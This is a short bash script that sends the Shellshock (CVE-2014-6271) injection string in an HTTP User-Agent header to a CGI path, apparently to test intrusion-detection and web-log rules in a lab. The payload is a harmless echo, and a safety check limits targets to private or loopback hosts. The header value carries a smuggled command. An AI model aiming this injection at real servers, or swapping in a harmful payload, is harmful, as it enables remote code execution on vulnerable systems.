#!/usr/bin/env bash
# Sends the classic CVE-2014-6271 *signature* in a User-Agent header to a LAB web server.
# Payload is a harmless 'echo'; it only exercises web-log/IDS detections.
# Usage: shellshock_probe.sh <host> [port=80] [path=/cgi-bin/test.cgi]
HOST="${1:?host required}"; PORT="${2:-80}"; URLPATH="${3:-/cgi-bin/test.cgi}"

# Safety: lab use only. Literal private/loopback IPv4 or localhost; anything else is refused.
if ! declare -F dv_require_lab_host >/dev/null 2>&1; then
  . "$(dirname "$0")/../lib/dv_safety.sh" 2>/dev/null || { echo "dv_safety.sh not found" >&2; exit 1; }
fi
dv_require_lab_host "$HOST"
curl -s -o /dev/null -m 10 -A '() { :; }; echo dv-shellshock-probe' "http://$HOST:$PORT$URLPATH" || true
echo "probe sent to $HOST:$PORT$URLPATH"
